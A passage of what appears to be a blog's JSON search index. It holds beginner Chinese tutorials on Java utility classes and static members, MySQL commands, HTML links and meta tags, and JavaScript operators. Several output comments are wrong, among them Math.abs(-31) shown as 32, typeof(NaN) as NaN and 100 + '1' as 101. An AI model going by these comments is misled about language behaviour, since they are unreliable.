System.out.println(count); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数学工具类Math","slug":"java00073数学工具类Math","date":"2020-03-03T04:10:55.000Z","updated":"2020-03-03T04:24:18.410Z","comments":true,"path":"2020/03/03/java00073数学工具类Math/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00073数学工具类Math/","excerpt":"","text":"java数学工具类Math java.lang.Math类是数学相关的工具类,里面提供了大量的静态方法,完成与数学运算的操作. public static double abs(double num):获取绝对值. public static double ceil(double num):向上取整. public static double floor(double num):向下取整. public static long round(double num):四舍五入. Math.PI代表圆周率 123456789101112131415161718192021222324252627282930313233package xiaochenyan.top.Demo;public class Main20&#123; public static void main(String[] args) &#123; double a = 31.2; double b = 31.9; double c = 31.0; //取绝对值 System.out.println(Math.abs(-31));//32 System.out.println(\"==========================================\"); //向上取整 System.out.println(Math.ceil(a));//32 System.out.println(Math.ceil(b));//32 System.out.println(Math.ceil(c));//32 //向下取整 System.out.println(\"==========================================\"); System.out.println(Math.floor(a));//31 System.out.println(Math.floor(b));//31 System.out.println(Math.floor(c));//31 System.out.println(\"==========================================\"); //四舍五入 System.out.println(Math.round(a));//31 System.out.println(Math.round(b));//32 System.out.println(Math.round(c));//31 System.out.println(\"==========================================\"); //圆周率 System.out.println(Math.PI);//3.141592653589793 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java将字符串转换为字符数组","slug":"java00072将字符串转换为字符数组","date":"2020-03-03T04:02:50.000Z","updated":"2020-03-03T04:09:06.916Z","comments":true,"path":"2020/03/03/java00072将字符串转换为字符数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00072将字符串转换为字符数组/","excerpt":"","text":"java将字符串转换为字符数组 格式: 字符串.toCharArray() 返回一个字符数组 12345678910111213package xiaochenyan.top.Demo;public class Main19&#123; public static void main(String[] args) &#123; String str = \"agsagasfsdtahsa\"; //将字符串转换为字符数组 char[] chars = str.toCharArray(); for (int i = 0; i &lt; chars.length; i++) &#123; System.out.println(chars[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java字符串倒序","slug":"java00071字符串倒序","date":"2020-03-03T03:57:23.000Z","updated":"2020-03-03T04:01:34.019Z","comments":true,"path":"2020/03/03/java00071字符串倒序/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00071字符串倒序/","excerpt":"","text":"java字符串倒序 快捷键技巧: 数组倒序遍历 数组名.forr自动生成: 123for (int i = arrayName.length-1; i &gt;= 0 ; i--) &#123;&#125; 1234567891011121314package xiaochenyan.top.Demo;import java.util.Arrays;public class Main17&#123; public static void main(String[] args) &#123; String[] str = &#123;\"aaa\",\"ddd\",\"ccc\",\"bbb\"&#125;; //先将字符串升序 Arrays.sort(str); //然后从后往前遍历数组 for (int i = str.length-1; i &gt;= 0 ; i--) &#123; System.out.println(str[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数组工具类Arrays","slug":"java00070数组工具类Arrays","date":"2020-03-03T03:44:05.000Z","updated":"2020-03-03T03:56:38.395Z","comments":true,"path":"2020/03/03/java00070数组工具类Arrays/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00070数组工具类Arrays/","excerpt":"","text":"java数组工具类Arrays java.util.Arrays是一个与数组相关的工具类,里面提供了大量静态方法,用来实现数组常见的操作. public static String toString(数组): 将参数数组变成字符串(按照默认格式: [元素1,元素2,元素3,…]) public static void sort(数组),按照默认升序(从小到大)对数组元素进行排序. 备注: 1.如果是数组,sort默认按照升序从小到大 2.如果是字符串,sort默认按照字母升序 3.如果是自定义的类型,那么这个自定义的类需要有Comparable或者Comparator接口支持. 1234567891011121314151617package xiaochenyan.top.Demo;import java.util.Arrays;public class Main18&#123; public static void main(String[] args) &#123; String[] str = &#123;\"aaa\",\"ccc\",\"bbb\"&#125;; int[] num = &#123;1,3,5,2,6,34,24&#125;; //str数组排序 Arrays.sort(str); //将str数组转换为字符串 System.out.println(Arrays.toString(str)); //int数组排序 Arrays.sort(num); //将int数组转换为字符串 System.out.println(Arrays.toString(num)); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"静态代码块","slug":"java00069静态代码块","date":"2020-02-29T12:20:39.000Z","updated":"2020-02-29T12:31:17.494Z","comments":true,"path":"2020/02/29/java00069静态代码块/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/29/java00069静态代码块/","excerpt":"","text":"静态代码块 静态代码块格式: 12345public class 类名&#123; static&#123; //静态代码块内容 &#125;&#125; 特点: 当第一次用到本类时,静态代码块执行唯一的一次 静态内容总是优先于非静态,所以静态代码块比构造方法先执行. 静态代码块用途: 用来一次性的对静态成员变量进行赋值. 12345public class demo01&#123; public static void main(String[] args) &#123; JinTaiDaiMaKuai one = new JinTaiDaiMaKuai(); &#125;&#125; 123456789public class JinTaiDaiMaKuai&#123; static &#123; System.out.println(\"我是静态代码块\"); &#125; public JinTaiDaiMaKuai() &#123; System.out.println(\"我是构造函数\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"静态static的内存图","slug":"java00068静态static的内存图","date":"2020-02-27T13:28:50.000Z","updated":"2020-02-27T13:29:52.382Z","comments":true,"path":"2020/02/27/java00068静态static的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/java00068静态static的内存图/","excerpt":"","text":"静态static的内存图","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"MYSQL常见命令","slug":"mysql006MYSQL常见命令","date":"2020-02-26T23:03:01.000Z","updated":"2020-02-26T23:20:14.392Z","comments":true,"path":"2020/02/27/mysql006MYSQL常见命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql006MYSQL常见命令/","excerpt":"","text":"MYSQL常见命令 1.查看当前所有的数据库 show databases; 2.打开指定的库 use 库名; 3.查看当前库的所有表 show tables; 4.查看其他库的所有表 show tables from 库名; 5.创建表 12345create table 表名( 列名 列类型, 列名 列类型, ...); 6.查看表结构 desc 表名; 7.查看数据库版本 方式一:登录到mysql服务端 select version(); 方式二:没有登录到mysql服务端 mysql --version或者mysql -V","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"MYSQL服务端的登录和退出","slug":"mysql005MYSQL服务端的登录和退出","date":"2020-02-26T22:49:57.000Z","updated":"2020-02-26T23:01:19.621Z","comments":true,"path":"2020/02/27/mysql005MYSQL服务端的登录和退出/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql005MYSQL服务端的登录和退出/","excerpt":"","text":"MYSQL服务端的登录和退出 1.用mysql自带的客户端 直接输入密码就可以进入数据库管理系统了 2.使用cmd登录 1234567891011121314151617181920// -h 连接的主机 -P 代表端口号//第一种方式mysql -h 主机名 -P 端口号 -u 用户名 -p// mysql -h localhost -P 3306 -u root -p//第二种方式mysql -h 主机名 -P 端口号 -u 用户名 -p密码//mysql -h localhost -P 3306 -u root -p123//-p后面没有空格//第三种方式//在服务端本机登录可以省略mysql -u 用户名 -pmysql -u 用户名 -p密码 退出 用exit命令或者Ctrl + C","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"MYSQL服务的启动和停止","slug":"mysql004MYSQL服务的启动和停止","date":"2020-02-26T22:43:46.000Z","updated":"2020-02-26T22:49:09.711Z","comments":true,"path":"2020/02/27/mysql004MYSQL服务的启动和停止/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql004MYSQL服务的启动和停止/","excerpt":"","text":"MYSQL服务的启动和停止 用管理员身份打开CMD命令 停止服务 1net stop 数据库服务名 开启服务 1net start 数据库服务名 第二种方式: 在图形服务管理中找到服务名,设置为开启状态","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"配置文件介绍","slug":"mysql003配置文件介绍","date":"2020-02-26T22:29:44.000Z","updated":"2020-02-26T22:42:43.192Z","comments":true,"path":"2020/02/27/mysql003配置文件介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql003配置文件介绍/","excerpt":"","text":"配置文件介绍 my.ini文件是数据库配置文件 客户端字符集 服务端配置: 服务端端口 服务端安装目录 数据库的管理文件目录 字符集 数据库存储引擎 语法模式 最大连接数 修改完之后,数据库服务要重启","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"MYSQL软件安装","slug":"mysql002MYSQL软件安装","date":"2020-02-26T21:26:20.000Z","updated":"2020-02-26T21:32:01.056Z","comments":true,"path":"2020/02/27/mysql002MYSQL软件安装/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/27/mysql002MYSQL软件安装/","excerpt":"","text":"MYSQL软件安装","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"数据库的相关概念","slug":"mysql001数据库的相关概念","date":"2020-02-24T01:59:40.000Z","updated":"2020-02-24T02:04:20.976Z","comments":true,"path":"2020/02/24/mysql001数据库的相关概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/24/mysql001数据库的相关概念/","excerpt":"","text":"数据库的相关概念","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xiaowuyoucy.github.io/categories/MYSQL/"}],"tags":[]},{"title":"静态static关键字修饰成员方法","slug":"java00067静态static关键字修饰成员方法","date":"2020-02-18T23:57:16.000Z","updated":"2020-02-19T00:37:04.747Z","comments":true,"path":"2020/02/19/java00067静态static关键字修饰成员方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00067静态static关键字修饰成员方法/","excerpt":"","text":"静态static关键字修饰成员方法 1.一旦使用static修饰成员方法,那么这就成为了静态方法. 2.静态方法不属于对象,而是属于类的. 3.如果没有用static关键字,那么首先必须先创建对象,然后通过对象才能使用成员方法. 4.对于静态方法来说,可以通过对象名进行调用,也可以通过类名来调用.但推荐使用类名来调用. 5.如果是使用对象名来调用静态成员变量,在编译之后也会被javac翻译成为类名.静态方法名 6.如果有了static关键字,那么不需要创建对象,直接就能通过类名称来使用它 7.无论是成员变量还是成员方法,如果有了static,都推荐使用类名称进行调用. 8.静态成员变量:类名称.静态变量; 9.静态方法:类名称.静态方法(); 10.对于在本类当中的静态方法,可以省略类名称. 注意: 1.静态不能直接访问非静态. 原因:因为在内存当中,是先有的静态内容,后有的非静态内容. 2.静态方法不能使用this. 原因:this代表当前对象,通过谁调用的方法,谁就是对象. 123456789101112131415public class Main16&#123; public static void main(String[] args) &#123; Student2 stu = new Student2(\"小明\"); Student2.room = \"101课室\"; //使用成员方法 stu.showVar(); //使用静态成员方法 Student2.showStaticVar(); stu.showStaticVar();//不推荐使用对象名调用静态成员方法 &#125;&#125; 12345678910111213141516171819202122232425262728293031//创建一个Student2类public class Student2&#123; String name;/*====================================================================*/ public static String room; public Student2() &#123; &#125; public Student2(String name) &#123; this.name = name; &#125; /*====================================================================*/ //非静态成员方法 public void showVar() &#123; System.out.println(\"名字: \" + this.name); System.out.println(\"年龄: \" + Student2.room); showStaticVar(); //在本类中可以直接使用静态成员方法,不用加类名 Student2.showStaticVar(); //加类名使用静态成员方法 &#125; //静态成员方法 //属于类,不属于对象 public static void showStaticVar()&#123; System.out.println(\"年龄: \" + Student2.room); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"静态static关键字修饰成员变量","slug":"java00066静态static关键字修饰成员变量","date":"2020-02-18T22:58:40.000Z","updated":"2020-02-19T00:52:12.961Z","comments":true,"path":"2020/02/19/java00066静态static关键字修饰成员变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00066静态static关键字修饰成员变量/","excerpt":"","text":"静态static关键字修饰成员变量 如果一个成员变量使用了static关键字,那么这个变量就不再属于对象自己,而是属于所在的类.多个对象共享同一份数据. 格式: 123static int number;public static String name;private static float jiGe; 使用静态成员变量: 类名.静态成员变量; 对象名.静态成员变量; 修改静态成员变量的值: 类名.静态成员变量 = 1; 对象名.静态成员变量 = 1; 12345678910111213141516171819202122232425262728public class Main15&#123; public static void main(String[] args) &#123; Student one = new Student(\"张三丰\",102); Student two = new Student(\"张无极\",23); Student three = new Student(\"赵敏\",18); Student four = new Student(\"周芷若\",18); //使用静态成员变量 Student.room = \"101教师\"; System.out.println(\"名字:\" + one.getName() + \" 年龄:\" + one.getAge() + \" 课室\" + one.room + \" 学号:\" + one.getId() ); System.out.println(\"名字:\" + two.getName() + \" 年龄:\" + two.getAge() + \" 课室\" + two.room + \" 学号:\" + two.getId() ); System.out.println(\"名字:\" + three.getName() + \" 年龄:\" + three.getAge() + \" 课室\" + three.room + \" 学号:\" + three.getId() ); System.out.println(\"名字:\" + four.getName() + \" 年龄:\" + four.getAge() + \" 课室\" + four.room + \" 学号:\" + four.getId() ); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738public class Student&#123; private String name; private int age; public static String room;//公开的静态成员变量 private int id; private static int countIdNumber;//私有的静态成员变量 public int getId() &#123; return id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public Student(String name, int age) &#123; this.name = name; this.age = age; id = ++countIdNumber; &#125; public Student() &#123; id = ++countIdNumber; &#125;&#125; 快捷键: ​ 数字.fori按下回车或tab键之后,会自动生成一个循环6次的for循环语句 1234for(int i = 0;i &lt; 6;i++)&#123;&#125; 数组名.fori 1234for(int i = 0;i &lt; 数组名.lenght;i++)&#123;&#125; 变量名.sout 1System.out.println(变量名); 对象.sout 1System.out.println(对象名); 对象名.成员变量.sout 1System.out.println(对象名.成员变量); 数组名[i].sout 1System.out.println(数组名[i]);","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"静态static关键字概述","slug":"java00065静态static关键字概述","date":"2020-02-18T22:52:09.000Z","updated":"2020-02-18T23:08:07.752Z","comments":true,"path":"2020/02/19/java00065静态static关键字概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00065静态static关键字概述/","excerpt":"","text":"静态static关键字概述 static关键字表示多个对象共用一个静态成员变量 这个成员变量属于类.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"按指定格式拼接字符练习","slug":"java00064按指定格式拼接字符-练习","date":"2020-02-18T21:26:59.000Z","updated":"2020-02-18T21:31:44.331Z","comments":true,"path":"2020/02/19/java00064按指定格式拼接字符-练习/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00064按指定格式拼接字符-练习/","excerpt":"","text":"按指定格式拼接字符练习 12345678910111213141516171819202122public class demo13&#123; public static void main(String[] args) &#123; int[] intArray = &#123;1,2,3,4&#125;; String str = pingJieZiFuChuan(intArray); System.out.println(str); &#125; public static String pingJieZiFuChuan(int[] intArray) &#123; String str = \"[\"; for (int i = 0; i &lt; intArray.length; i++) &#123; if(i == intArray.length - 1) &#123; str += \"word\" + intArray[i] + \"]\"; &#125;else&#123; str += \"word\" + intArray[i] +\"#\"; &#125; &#125; return str; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"统计输入的字符串中的各种字符次数","slug":"java00063统计输入的字符串中的各种字符次数","date":"2020-02-18T21:02:24.000Z","updated":"2020-02-18T21:09:27.250Z","comments":true,"path":"2020/02/19/java00063统计输入的字符串中的各种字符次数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00063统计输入的字符串中的各种字符次数/","excerpt":"","text":"统计输入的字符串中的各种字符次数 1234567891011121314151617181920212223242526272829303132333435363738import java.util.Scanner;public class demo14&#123; public static void main(String[] args) &#123; String str ; int countNumber = 0; int countOther = 0; int countLower = 0; int countUpper = 0; Scanner sc = new Scanner(System.in); System.out.println(&quot;请输入字符串:&quot;); str = sc.next(); char[] chs = str.toCharArray(); for (int i = 0; i &lt; chs.length; i++) &#123; char ch = chs[i]; if(ch &gt;= &apos;a&apos; &amp;&amp; ch &lt;= &apos;z&apos;) &#123; countLower++; &#125;else if(ch &gt;= &apos;A&apos; &amp;&amp; ch &lt;= &apos;Z&apos; ) &#123; countUpper++; &#125;else if(ch &gt;= &apos;0&apos; &amp;&amp; ch &lt;= &apos;9&apos; )&#123; countNumber++; &#125;else &#123; countOther++; &#125; &#125; System.out.println(&quot;大写字母个数:&quot; + countUpper); System.out.println(&quot;小写字母个数:&quot; + countLower); System.out.println(&quot;数字个数:&quot; + countNumber); System.out.println(&quot;其他字符个数:&quot; + countOther); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的分割方法","slug":"java00059字符串的分割方法","date":"2020-02-18T20:17:16.000Z","updated":"2020-02-18T20:26:55.295Z","comments":true,"path":"2020/02/19/java00059字符串的分割方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00059字符串的分割方法/","excerpt":"","text":"字符串的分割方法 分割字符串的方法: public String[] split(String regex);按照参数的规则,将字符串切分成为若干部分. 注意事项: split方法的参数其实是一个&quot;正则表达式&quot;. 如果用英文句点&quot;.&quot;进行切分,必须写&quot;\\\\.&quot;(两个反斜杠) 123456789101112131415161718public class demo12&#123; public static void main(String[] args) &#123; String str1 = \"123,123,12w\"; String str2 = \"aaa.bbb.ccc\"; String[] strArray = str1.split(\",\"); for (int i = 0; i &lt; strArray.length; i++) &#123; System.out.println(strArray[i]); &#125; System.out.println(\"=========================\"); String[] str2Array = str2.split(\"\\\\.\"); for (int i = 0; i &lt; str2Array.length; i++) &#123; System.out.println(str2Array[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的转换相关方法","slug":"java00058字符串的转换相关方法","date":"2020-02-18T20:05:25.000Z","updated":"2020-02-18T20:10:56.491Z","comments":true,"path":"2020/02/19/java00058字符串的转换相关方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00058字符串的转换相关方法/","excerpt":"","text":"字符串的转换相关方法 String当中与转换相关的常用方法: public char[] toCharArray();将当前字符串拆分成为字符数组作为返回值. public byte[] getBytes();获得当前字符串底层的字节数组 public String replace(CharSequence oldString,CharSequence newString); 将所有出现的老字符串替换成为新的字符串,返回替换之后的结果为新字符串. 12345678910111213141516171819202122public class demo11&#123; public static void main(String[] args) &#123; String str1 = \"我爱你\"; char[] chArray = str1.toCharArray();//将str1转换为char[]数组 byte[] by = str1.getBytes();//将str1转换为byte[]数组; System.out.println(chArray[0]); for (int i = 0; i &lt; by.length; i++) &#123; System.out.println(by[i]); &#125; System.out.println(\"========================\"); String str2 = \"你麻痹的,你会不会啊\"; String str3 = str2.replace(\"麻痹\", \"**\");//str2.replace(要替换的字符串,替换的字符); System.out.println(str3); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的截取方法","slug":"java00057字符串的截取方法","date":"2020-02-18T19:26:50.000Z","updated":"2020-02-18T19:46:16.714Z","comments":true,"path":"2020/02/19/java00057字符串的截取方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/19/java00057字符串的截取方法/","excerpt":"","text":"字符串的截取方法 public String substring(int index);截取从参数位置一直到字符串末尾,返回新字符串. public String substring(int begin,int end); 截取从begin开始,一直到end结束. 备注:[begin,end),包含左边,不包含右边 快捷键: 按住ctrl + shift + 方向左右键可以多选字符串 按住shift + 方向左右键可以单选多个字符 123//改变String 对象的内容,其实是改变字符串的地址String str1 = \"123\";str1 = \"456\"; 12345678910111213141516public class demo10&#123; public static void main(String[] args) &#123; String str1 = \"123456\"; String str2 = str1.substring(2);//从第2号元素开始截取,一直到结束 System.out.println(str2); str2 = str1.substring(3,6); System.out.println(str2);//从第3号元素开始,一直到第6号元素.不包含第6号元素; str1 = \"11111\"; //0x1111 str1 = \"22222\"; //0x8888 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"超链接","slug":"html-css00014超链接","date":"2020-02-18T01:46:04.000Z","updated":"2020-03-03T13:12:11.709Z","comments":true,"path":"2020/02/18/html-css00014超链接/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00014超链接/","excerpt":"","text":"超链接 使用超链接可以让我们从一个页面跳转到另一个页面 使用a标签来创建一个超链接: 属性: href:指向链接跳转的目标地址,可以写一个相对路径也可以写一个完整地址. target:可以用来指定打开链接的位置 可选值: _self:表示在当前窗口中打开(默认值) _blank:在新的窗口中打开链接 ​ 123&lt;!-- 超链接 --&gt;&lt;a href=\"http://www.baidu.com\"&gt;我是一个超链接&lt;/a&gt;&lt;a href=\"demo.html\"&gt; 我是一个超链接&lt;/a&gt; 在新窗口打开页面 1234&lt;!-- 在本窗口跳转 --&gt;&lt;a href=\"http://www.baidu.com\" target=\"_self\"&gt;我是一个超链接&lt;/a&gt;&lt;!-- 在新窗口打开 --&gt;&lt;a href=\"demo.html\" target=\"_blank\"&gt; 我是一个超链接&lt;/a&gt; 可以在内联框架标签中设置一个name属性值,链接将会在指定的内联框架中打开 123&lt;!-- 内联框架中打开 --&gt;&lt;iframe src=\"demo.html name=\"tom\"&gt;&lt;/iframe&gt;&lt;a href=\"demo.html\" target=\"tom\"&gt;我在内联框架显示&lt;/a&gt; center标签中的内容,会默认在页面中居中显示 如果我们要内容居中显示,要把内容都放到center标签中 123456&lt;!-- 居中显示 --&gt;&lt;center&gt; a aaaaaa aaaaaa&lt;/center&gt; 如果href中地址不确定,可以先用#代替 如果将链接地址设置为#,点击后会自动回到页面顶部 12&lt;!--回到页面顶部--&gt;&lt;a href=\"#\" target=\"tom\"&gt;我在内联框架显示&lt;/a&gt; html中有一个属性,每一个元素都可以设置,该属性可以作为标签的唯一标识 这个属性就是id,id属性在同一个页面中只能有一个,不能有重复 跳转到id为bottom的元素所在的位置 直接在href中写 #id属性值 12345&lt;a href=\"#bottom\"&gt;回到底部&lt;/a&gt;&lt;!--跳到这里--&gt;&lt;a id=\"bottom\" href=\"https://www.baidu.com\"&gt;哈哈哈&lt;/a&gt; 发送邮件的超链接,点击链接以后可以自动打开计算机中默认的邮件客户端 当点击这个链接时会自动打开计算机中默认的邮件客户端,并且将收件人设置为mailto后的邮箱地址. 格式: &lt;a href=&quot;mailto:邮箱地址&quot; &gt;联系我们&lt;a&gt; 1&lt;a href=\"mailto:123@qq.com\" &gt;联系我们&lt;a&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"内联框架","slug":"html-css00013内联框架","date":"2020-02-17T22:29:31.000Z","updated":"2020-02-17T22:39:32.645Z","comments":true,"path":"2020/02/18/html-css00013内联框架/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00013内联框架/","excerpt":"","text":"内联框架 使用内联框架可以引入一个外部的页面. 使用iframe来创建一个内联框架 属性: src:指向一个外部页面的路径,可以使用相对路径 width:设置宽度 height:设置高度 不会按比例缩放 name:可以为内联框架指定一个name属性(给框架起名字) 在现实开发中不推荐使用内联框架,因为内联框架中的内容不会被搜索引擎所检索,但可以在内网使用; 一般放在body标签内 格式:&lt;iframe scr=&quot;目标路径&quot; name=&quot;名字&quot;&gt; 1&lt;iframe scr=\"demo.html\" name=\"tom\"&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"xHtml的语法规范","slug":"html-css00012xHtml的语法规范","date":"2020-02-17T21:25:32.000Z","updated":"2020-02-18T02:26:50.768Z","comments":true,"path":"2020/02/18/html-css00012xHtml的语法规范/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00012xHtml的语法规范/","excerpt":"","text":"xHtml的语法规范 浏览器会尽最大的努力正确解析错误的语法,你所有的不符合语法规范的内容,浏览器都会为你自动修正,但是有些情况会修正错误. 1.HTML中不区分大小写,但是我们一般都使用小写 1&lt;p&gt;aaaaaaaaa&lt;/p&gt; 2.HTML中的注释不能嵌套 1234567891011&lt;!--正确写法--&gt;=================================================错误写法&lt;!-- &lt;!-- --&gt;--&gt; 3.HTML标签必须结构完整,要么成对出现,要么自结束标签. 12345&lt;!--正确写法--&gt;&lt;p&gt;aaaaa&lt;/p&gt; &lt;!--错误写法--&gt;&lt;p&gt;asdfdsf 4.HTML标签可以嵌套,但是不能交叉嵌套. 12345&lt;!--正确写法--&gt;&lt;p&gt;aaaa&lt;font color=\"red;\"&gt;aaa&lt;/font&gt;aaa&lt;/p&gt;&lt;!--错误写法--&gt;&lt;p&gt;aaaa&lt;font color=\"red;\"&gt;aaaaaa&lt;/p&gt;&lt;/font&gt; 5.HTML标签中的属性必须有值,且值必须加引号(双引号,单引号都可以) 12345&lt;!--正确写法--&gt;&lt;p&gt;aaaa&lt;font color=\"red;\"&gt;aaa&lt;/font&gt;aaa&lt;/p&gt;&lt;!--错误写法--&gt;&lt;p&gt;aaaa&lt;font color&gt;aaa&lt;/font&gt;aaa&lt;/p&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"meta标签","slug":"html-css00011meta标签","date":"2020-02-17T21:09:02.000Z","updated":"2020-02-18T02:23:00.419Z","comments":true,"path":"2020/02/18/html-css00011meta标签/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00011meta标签/","excerpt":"","text":"meta标签 使用meta标签还可以用来设置网页的关键字 格式:&lt;meta name=&quot;keywords&quot; content = &quot;关键字&quot; /&gt; 如果是多个关键字,就用逗号隔开. 关键字是被搜索引擎识别的. 1&lt;meta name=\"keywords\" content=\"HTML5,JavaScript,前端,Java\" /&gt; 使用meta标签用来指定网页的描述 搜索引擎在检索页面时,会同时检索页面中的关键字和描述,但是这两个值不会影响页面在搜索引擎中的排名. 格式:&lt;meta name=&quot;description&quot; content=&quot;描述信息&quot; /&gt; 1&lt;meta name=\"description\" content=\"发布h5,js前端等相关信息\" /&gt; 使用meta可以用来做请求重定向(页面跳转). 格式:&lt;meta http-equiv=&quot;refresh&quot; content=&quot;秒数;url=目标路径&quot; /&gt; 目标路径可以是相对地址 绝对路径要在开头加上https://或http:// 1&lt;meta http-equiv=\"refresh\" content=\"5;http://www.baidu.com\" /&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"算数运算符","slug":"JS00015算数运算符","date":"2020-02-17T09:11:12.000Z","updated":"2020-03-01T10:10:49.980Z","comments":true,"path":"2020/02/17/JS00015算数运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00015算数运算符/","excerpt":"","text":"算数运算符 运算符也叫操作符 通过运算符可以对一个或多个值进行运算,并获取运算结果 比如:typeof就是运算符,可以来获得一个值的类型,它会将该值的类型以字符串的形式返回number string boolean undefined object 1234567console.log(typeof(\"123\"));//stringconsole.log(typeof(1));//numberconsole.log(typeof(1.6));//numberconsole.log(typeof(null));//objectconsole.log(typeof(undefined));//undefinedconsole.log(typeof(NaN));//NaNconsole.log(typeof(true));//boolean 算数运算符: + - * / % 当对非Number类型的值进行运算时,会将这些值转换为Number然后在运算. 任何值和NaN做运算都得NaN 1. +可以对两个值进行加法运算,并将结果返回. 如果对两个字符串做加法,则会拼接在一起 任何值和字符串做加法运算,都会先转换为字符串,然后再拼接 我们可以利用这一点特性来为任何数据类型做String转换. 这是一种隐式类型转换,实际上也是调用了String() 1234567891011121314var a = 123;a = 123 + 2;//125a = true + 1;//2a = true + false;//1a = 2 + null;//2a = 2 + NaN;//NaNa = \"aaa\" + \"bbb\";//aaabbba = 100 + \"aa\";//100aa 2. -可以对两个值进行减法运算,并将结果返回 任何数据类型和数字做减法都会先转换为Number 123456var a = 100;a = 100 - 1;//99a = 100 - \"1\";//99console.log(a - NaN);//NaNconsole.log(a - null);//100console.log(a - undefined);//NaN 3. *可以对两个值进行乘法运算,并将结果返回 任何数据类型和数字做乘法都会先转换为Number 123456var a = 100;a = 100 * 1;//100a = 100 * \"1\";//100console.log(a * NaN);//NaNconsole.log(a * null);//0console.log(a * undefined);//NaN 4. /可以对两个值进行除法运算,并将结果返回 任何数据类型和数字做除法都会先转换为Number 可以通过为一个值0 * &quot; 1 &quot; /1来将其转换为Number 原理和Number()函数一样,使用起来更加简单 1234567var a = 100;a = 100 / 1;//100a = 100 / \"1\";//100console.log(a / NaN);//NaNconsole.log(a / null);//出错 0不能做除数console.log(a / undefined);//NaNconsole.log(a + \"1\");//101 